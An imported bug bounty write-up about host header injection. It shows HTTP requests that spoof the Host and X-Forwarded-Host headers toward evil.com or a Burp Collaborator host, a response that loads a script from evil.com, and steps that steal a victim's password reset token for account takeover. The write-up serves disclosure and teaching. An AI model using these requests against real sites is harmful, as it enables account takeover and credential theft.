---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-25_1250-worth-of-host-header-injection.md
original_filename: 2023-09-25_1250-worth-of-host-header-injection.md
title: $1,250 worth of Host Header Injection
category: documents
detected_topics:
- password-reset
- otp
- command-injection
- mfa
- csrf
tags:
- imported
- documents
- password-reset
- otp
- command-injection
- mfa
- csrf
language: en
raw_sha256: 8cb5b2d6b1e0de3550126dff910fcb27ac093b2a48b4a4031d6a5d6ed0258412
text_sha256: bffa540e78dda7dc14e8c75c5ffd021524cc1a759628bb57cdfb421176e2df32
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: true
---

# $1,250 worth of Host Header Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-25_1250-worth-of-host-header-injection.md
- Source Type: markdown
- Detected Topics: password-reset, otp, command-injection, mfa, csrf
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: True
- Raw SHA256: `8cb5b2d6b1e0de3550126dff910fcb27ac093b2a48b4a4031d6a5d6ed0258412`
- Text SHA256: `bffa540e78dda7dc14e8c75c5ffd021524cc1a759628bb57cdfb421176e2df32`


## Content

---
title: "$1,250 worth of Host Header Injection"
url: "https://medium.com/@salman_bugskipper/1-250-worth-of-host-header-injection-96563a2ac7e8"
authors: ["Salman Khan (@salman_ashlor)"]
bugs: ["Host header injection", "Web cache poisoning", "Account takeover", "Password reset"]
bounty: "1,250"
publication_date: "2023-09-25"
added_date: "2023-10-03"
source: "pentester.land/writeups.json"
original_index: 745
scraped_via: "browseros"
---

# $1,250 worth of Host Header Injection

1

$1,250 worth of Host Header Injection
Salman K.
Follow
4 min read
·
Sep 24, 2023

1.7K

11

Press enter or click to view image in full size

What is Host Header Injection?

Host header injection is a web security vulnerability that occurs when an attacker manipulates the “Host” header in an HTTP request to a web server. This header is part of the HTTP protocol and is used to specify the target domain or host to which the request should be sent. Host header injection attacks typically target websites that rely on the “Host” header to determine the virtual host or website to serve. Here’s how it works and why it can have a significant impact on websites:

Manipulating the Host Header: In a typical HTTP request, the “Host” header specifies the domain name or IP address of the server the client wants to communicate with. For example:

GET /page HTTP/1.1
Host: www.example.com

An attacker with the ability to control or influence the “Host” header can change it to a different domain, potentially one they control:

GET /page HTTP/1.1
Host: malicious.com
How Can You Exploit This Vulnerability:

Obviously, it’s not that easy to obtain $1,200 from anyone. Host Header Injection is considered an informational or P5 severity vulnerability, unless you can demonstrate a significant impact, such as an account takeover using the ‘forgot password’ functionality or other chained vulnerabilities like Web Cache Poisoning.

Get Salman K.’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Request:

GET /account/forgotpassword HTTP/2
Host: target.com
X-Forwarded-Host: evil.com
Cookie: asd=1234;
Accept: text/html,application/xhtml+xml,application/xml;
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br

Response:

HTTP/1.1 200 Ok
...
Response Headers
...

<html>
<head>
<title>Web Page</title>
<script src="https://evil.com/index.php">
<html>
Account Takeover via Host Header injection:
Initially, I begin by accessing the “Forgot Password” functionality and initiate a password reset request.
Subsequently, I receive a link containing a reset password token.
In order to assess the potential existence of a vulnerability, I deliberately introduce a full stop (period) character (“.”) at the end of the HOST header within the reset password request and proceed to transmit it. The altered header appears as follows: Host: target.com.
POST /account/forgotpassword?returnUrl=%2Fconnect%2Fauthorize%2Fcallback HTTP/2
Host: target.com.
Cookie: csrf=123;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Origin: https://target.com
Referer: https://target.com/account/forgotpassword?returnUrl=%2Fconnect%2F
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

UserEmail=gdfcg%40gg.jjh&__RequestVerificationToken=CfDJ8GDFIfdscxdswacdqf6U3KlURi0Grkuo8sBP858JcLQAG_cNRggywWo76y3VIxmhy1vfVl4-lHCOhVaoH72y9nkRwyBI4iGQtac***REDACTED-SUSPECT-TOKEN***4. When I checked my email this time, I received a reset password token that included the full stop I had inserted in the Host Header. This confirms that the website is vulnerable to host header injection.

https://target.com./forgetpassword?userid=123&code=2wwdsb3wehsuwhswgbsuwgqeu

5. When I attempted to add anything after the full stop, I received a 404 error. This indicates that I need to bypass this limitation in order to proceed with further exploitation.

Press enter or click to view image in full size

6. So, I crafted the reset password request by adding the full URL to the top of the request in order to receive a ‘200 OK’ response

POST https://target.com/account/forgotpassword?returnUrl=%2Fconnect%2F HTTP/2
Host: target.com.a
Cookie: csrf=CfDJ8GDFIImEfuZMtjMUAD0wjkSdISqxtWbF9MT0WcjjItWKvv71ykCvBLAfhH45TNQd7Crf9INSWcMvbvgfPDdG1wx-lHyAE5mWs107rzfTUfNSpak2pVHjo7Ff3vK0mltaC4X26-YwDQN1SvOrRTIHFygaQJM
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 213
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

UserEmail=gdfcg%40gg.jjh&__RequestVerificationToken=CfDJ8GDFIImEfuZMtjMUAD0wjkSZZhL3qf6U3KlURi0Grkuo8sBP858JcLQAG_cNRgdsfxsdgywWo76y3VIxmhy1vfVl4-lHCOhVaoH72y9nkRwyBI4iGQtac***REDACTED-SUSPECT-TOKEN***7. But Now I get 400 Bad Request:

Press enter or click to view image in full size

8.After some contemplation and research, I came to the realization that the current version of Burp Suite might be responsible for producing a ‘400 Bad Request’ error. Consequently, I made the decision to utilize an older version of Burp Suite, such as 1.7.34.

9. And BOOOOOOOOOOOOOOOOOOOOOM, I succeeded.

Press enter or click to view image in full size

10. Now, to demonstrate the full exploit, I simply added the Burp Collaborator link to the Host Header and sent the request.

Press enter or click to view image in full size

11. The victim will receive the crafted reset password link. Whenever the victim clicks on this link, I will receive their reset password token in my Burp Collaborator.

Press enter or click to view image in full size

12. Now I can use this token to take over the victim’s account, and as a result, I received a bounty of $1,250.

Press enter or click to view image in full size
Happy Hunting!!!!

My LinkedIn: https://www.linkedin.com/in/salman-ashlor
My Twitter: (9) salman khan ashlor (@salman_ashlor) / X (twitter.com)
